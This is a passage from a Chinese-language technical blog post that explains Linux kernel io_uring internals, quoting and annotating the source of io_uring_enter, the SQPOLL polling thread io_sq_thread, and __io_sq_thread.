class="line">sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line">sqd-&gt;task_tgid = current-&gt;tgid;</span><br><span class="line">tsk = create_io_thread(io_sq_thread, sqd, NUMA_NO_NODE);</span><br><span class="line"><span class="comment">// 创建处理线程</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tsk)) &#123;</span><br><span class="line">ret = PTR_ERR(tsk);</span><br><span class="line"><span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sqd-&gt;thread = tsk;</span><br><span class="line">ret = io_uring_alloc_task_context(tsk, ctx);</span><br><span class="line">wake_up_new_task(tsk);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line"><span class="comment">/* Can&#x27;t have SQ_AFF without SQPOLL */</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_sqpoll:</span><br><span class="line">complete(&amp;ctx-&gt;sq_data-&gt;exited);</span><br><span class="line">err:</span><br><span class="line">io_sq_thread_finish(ctx);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-enter"><code>io_uring_enter</code></h3><p>首先是对于flag的检查和确认，这里不一一赘述了，感兴趣的去看相应的man page更能了解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(io_uring_enter, <span class="type">unsigned</span> <span class="type">int</span>, fd, u32, to_submit,</span><br><span class="line">u32, min_complete, u32, flags, <span class="type">const</span> <span class="type">void</span> __user *, argp,</span><br><span class="line"><span class="type">size_t</span>, argsz)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(flags &amp; ~(IORING_ENTER_GETEVENTS | IORING_ENTER_SQ_WAKEUP |</span><br><span class="line">       IORING_ENTER_SQ_WAIT | IORING_ENTER_EXT_ARG |</span><br><span class="line">       IORING_ENTER_REGISTERED_RING)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ring fd has been registered via IORING_REGISTER_RING_FDS, we</span></span><br><span class="line"><span class="comment"> * need only dereference our task private array to find it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_REGISTERED_RING) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!tctx || fd &gt;= IO_RINGFD_REG_MAX))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">fd = array_index_nospec(fd, IO_RINGFD_REG_MAX);</span><br><span class="line">f.file = tctx-&gt;registered_rings[fd];</span><br><span class="line">f.flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">f = fdget(fd);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">ret = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_is_uring_fops(f.file)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx = f.file-&gt;private_data;</span><br><span class="line">ret = -EBADFD;</span><br><span class="line"><span class="keyword">if</span> (unlikely(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SQPOLL模式下,直接返回提交数,可选择性wakeup线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQ polling, the thread will do all submissions and completions.</span></span><br><span class="line"><span class="comment"> * Just return the requested submit count, and wake the thread if</span></span><br><span class="line"><span class="comment"> * we were asked to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">io_cqring_overflow_flush(ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ctx-&gt;sq_data-&gt;thread == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">ret = -EOWNERDEAD;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAKEUP)</span><br><span class="line"><span class="comment">// 这个flag处于和用户态共享的内存 </span></span><br><span class="line"><span class="comment">// 如果sq处理线程休眠了，并需要唤醒</span></span><br><span class="line"><span class="comment">// 可以通过设置 IORING_ENTER_SQ_WAKEUP， 再通过此syscall 来唤醒</span></span><br><span class="line">wake_up(&amp;ctx-&gt;sq_data-&gt;wait);</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAIT)</span><br><span class="line">io_sqpoll_wait_sq(ctx);</span><br><span class="line"></span><br><span class="line">ret = to_submit;</span><br></pre></td></tr></table></figure><p>非SQPOLL模式,执行提交请求到SQ环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (to_submit) &#123;</span><br><span class="line">ret = io_uring_add_tctx_node(ctx);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line"><span class="comment">// 直接提交 sqes </span></span><br><span class="line"><span class="comment">// 这个函数将在后面分析</span></span><br><span class="line"><span class="comment">// SQPOLL 模式下创建的io_sq_thread 也会调用此函数</span></span><br><span class="line"><span class="keyword">if</span> (ret != to_submit) &#123;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;syscall_iopoll)</span><br><span class="line"><span class="keyword">goto</span> iopoll_locked;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ignore errors, we&#x27;ll soon call io_cqring_wait() and</span></span><br><span class="line"><span class="comment"> * it should handle ownership problems if any.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN)</span><br><span class="line">(<span class="type">void</span>)io_run_local_work_locked(ctx);</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line"><span class="comment">// 如果请求获取完成事件</span></span><br><span class="line"><span class="type">int</span> ret2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;syscall_iopoll) &#123;</span><br><span class="line"><span class="comment">// 如果开启了syscall轮询模式,执行iopoll逻辑 </span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We disallow the app entering submit/complete with</span></span><br><span class="line"><span class="comment"> * polling, but we still need to lock the ring to</span></span><br><span class="line"><span class="comment"> * prevent racing with polled issue that got punted to</span></span><br><span class="line"><span class="comment"> * a workqueue.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">iopoll_locked:</span><br><span class="line">ret2 = io_validate_ext_arg(flags, argp, argsz);</span><br><span class="line"><span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">min_complete = min(min_complete,</span><br><span class="line">   ctx-&gt;cq_entries);</span><br><span class="line">ret2 = io_iopoll_check(ctx, min_complete);</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">sigset_t</span> __user *sig;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">kernel_timespec</span> __<span class="title">user</span> *<span class="title">ts</span>;</span></span><br><span class="line"></span><br><span class="line">ret2 = io_get_ext_arg(flags, argp, &amp;argsz, &amp;ts, &amp;sig);</span><br><span class="line"><span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">min_complete = min(min_complete,</span><br><span class="line">   ctx-&gt;cq_entries);</span><br><span class="line">ret2 = io_cqring_wait(ctx, min_complete, sig,</span><br><span class="line">      argsz, ts);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">ret = ret2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * EBADR indicates that one or more CQE were dropped.</span></span><br><span class="line"><span class="comment"> * Once the user has been informed we can clear the bit</span></span><br><span class="line"><span class="comment"> * as they are obviously ok with those drops.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret2 == -EBADR))</span><br><span class="line">clear_bit(IO_CHECK_CQ_DROPPED_BIT,</span><br><span class="line">  &amp;ctx-&gt;check_cq);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果请求获取完成事件<ul><li>如果开启了syscall轮询模式,执行iopoll逻辑</li><li>否则执行等待完成事件逻辑</li></ul></li></ul><h2 id="kernel-2">kernel</h2><p>最后是io_uring 内核的任务处理, 在这里先给出一个流程图, 然后再具体分析各个函数</p><p><img src="/images/io_uring.png" alt="io_uring"></p><p>图来自 <a href="https://zhuanlan.zhihu.com/p/380726590">https://zhuanlan.zhihu.com/p/380726590</a> , 侵删//</p><h3 id="io-sq-thread-内核任务提交机制"><code>io_sq_thread</code> | 内核任务提交机制</h3><p>io_sq_thread是 <code>SQPOLL</code> 模式下内核任务轮询线程.<br>首先设置线程环境</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_sq_thread</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span> =</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> timeout = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line">DEFINE_WAIT(wait);</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-sqp-%d&quot;</span>, sqd-&gt;task_pid);</span><br><span class="line">set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* reset to our pid after we&#x27;ve set task_comm, for fdinfo */</span></span><br><span class="line">sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sqd-&gt;sq_cpu != <span class="number">-1</span>) &#123;</span><br><span class="line">set_cpus_allowed_ptr(current, cpumask_of(sqd-&gt;sq_cpu));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">set_cpus_allowed_ptr(current, cpu_online_mask);</span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来获取锁并进入无限循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br></pre></td></tr></table></figure><p>设置好timeout</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_sqd_events_pending(sqd) || signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (io_sqd_handle_event(sqd))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// sq_thread_idle 来自用户在 params 设置的时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这个线程创建在内存分配好之后， 即，即使是第一次进入此线程， 如果 sqes对应内存有任务，也会处理任务， 意味着在 <code>io_uring_setup</code> 之前，在sqes写好的任务，也可以被处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cap_entries = !list_is_singular(&amp;sqd-&gt;ctx_list);</span><br><span class="line"><span class="comment">// 获取是否有多个io_ring的标记cap_entries</span></span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line"><span class="comment">// 遍历注册的io_ring,调用__io_sq_thread做实际的轮询操作</span></span><br><span class="line"><span class="type">int</span> ret = __io_sq_thread(ctx, cap_entries);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sqt_spin &amp;&amp; (ret &gt; <span class="number">0</span> || !wq_list_empty(&amp;ctx-&gt;iopoll_list)))</span><br><span class="line">sqt_spin = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//  如果有事件处理或iopoll任务,则设置sqt_spin标记</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (io_run_task_work())</span><br><span class="line"><span class="comment">// 调用io_run_task_work处理排队的工作任务</span></span><br><span class="line">sqt_spin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sqt_spin || !time_after(jiffies, timeout)) &#123;</span><br><span class="line"><span class="comment">// 如果有待处理事件或时间没超时</span></span><br><span class="line"><span class="keyword">if</span> (sqt_spin)</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// 如果有待处理事件,更新下一次超时时间</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(need_resched())) &#123;</span><br><span class="line"><span class="comment">// 检查是否需要调度,如果需要,主动释放并重新获取锁</span></span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line">cond_resched();</span><br><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// 没超时就直接continue， 因为之后就是判断是否需要阻塞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来实现io_uring SQ线程的阻塞和唤醒逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">prepare_to_wait(&amp;sqd-&gt;wait, &amp;wait, TASK_INTERRUPTIBLE);</span><br><span class="line"><span class="comment">// 将当前线程设置为可中断状态TASK_INTERRUPTIBLE</span></span><br><span class="line"><span class="keyword">if</span> (!io_sqd_events_pending(sqd) &amp;&amp; !task_work_pending(current)) &#123;</span><br><span class="line"><span class="type">bool</span> needs_sched = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 检查是否有待处理事件和任务</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line"><span class="comment">// 若没有则遍历所有注册的io_ring</span></span><br><span class="line">atomic_or(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line"><span class="comment">// 设置IORING_SQ_NEED_WAKEUP标志</span></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">    !wq_list_empty(&amp;ctx-&gt;iopoll_list)) &#123;</span><br><span class="line">    <span class="comment">// 检查iopoll和SQ队列是否为空</span></span><br><span class="line">needs_sched = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ensure the store of the wakeup flag is not</span></span><br><span class="line"><span class="comment"> * reordered with the load of the SQ tail</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">smp_mb__after_atomic();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (io_sqring_entries(ctx)) &#123;</span><br><span class="line">needs_sched = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (needs_sched) &#123;</span><br><span class="line"><span class="comment">// 如果需要调度</span></span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="comment">// 释放锁调度</span></span><br><span class="line">schedule();</span><br><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="comment">// 唤醒后重新获取锁和CPU信息</span></span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line"><span class="type">atomic_andnot</span>(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line"><span class="comment">// 否则清除唤醒标记</span></span><br><span class="line">&#125;</span><br><span class="line">finish_wait(&amp;sqd-&gt;wait, &amp;wait);</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// 更新等待时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是退出无限循环时的清理机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io_uring_cancel_generic(<span class="literal">true</span>, sqd);</span><br><span class="line">sqd-&gt;thread = <span class="literal">NULL</span>;</span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line">atomic_or(IORING_SQ_NEED_WAKEUP, &amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line">io_run_task_work();</span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line"></span><br><span class="line">complete(&amp;sqd-&gt;exited);</span><br><span class="line">do_exit(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="io-sq-thread"><code>__io_sq_thread</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_sq_thread(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">bool</span> cap_entries)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> to_submit;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">to_submit = io_sqring_entries(ctx);</span><br><span class="line"><span class="comment">/* if we&#x27;re handling multiple rings, cap submit size for fairness */</span></span><br><span class="line"><span class="keyword">if</span> (cap_entries &amp;&amp; to_submit &gt; IORING_SQPOLL_CAP_ENTRIES_VALUE)</span><br><span class="line">to_submit = IORING_SQPOLL_CAP_ENTRIES_VALUE;</span><br><span class="line"><span class="comment">// 计算需要提交的任务数量</span></span><br><span class="line"><span class="comment">// 如果需要公平,则 cap 为固定最大值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list) || to_submit) &#123;</span><br><span class="line"><span class="comment">// 如果有 iopoll 任务或可提交请求</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;sq_creds != current_cred())</span><br><span class="line">creds = override_creds(ctx-&gt;sq_creds);</span><br><span class="line"><span class="comment">// 保存和恢复 creds 身份信息避免安全漏洞</span></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"><span class="comment">// 上锁保护关键区</span></span><br><span class="line"><span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list))</span><br><span class="line">io_do_iopoll(ctx, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 处理 iopoll 轮询事件</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t submit if refs are dying, good for io_uring_register(),</span></span><br><span class="line"><span class="comment"> * but also it is relied upon by io_ring_exit_work()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (to_submit &amp;&amp; likely(!percpu_ref_is_dying(&amp;ctx-&gt;refs)) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line"><span class="comment">// 提交请求到 SQ 环</span></span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (to_submit &amp;&amp; wq_has_sleeper(&amp;ctx-&gt;sqo_sq_wait))</span><br><span class="line">wake_up(&amp;ctx-&gt;sqo_sq_wait);</span><br><span class="line"><span class="comment">// 唤醒 sqo_sq 等待线程</span></span><br><span class="line"><span class="keyword">if</span> (creds)</span><br><span class="line">revert_creds(creds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>io_sqring_entries</code>  逻辑如下</p><p>所以内核在SQPOLL 模式下判断是否有任务需要执行，就是看 tail 是否更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 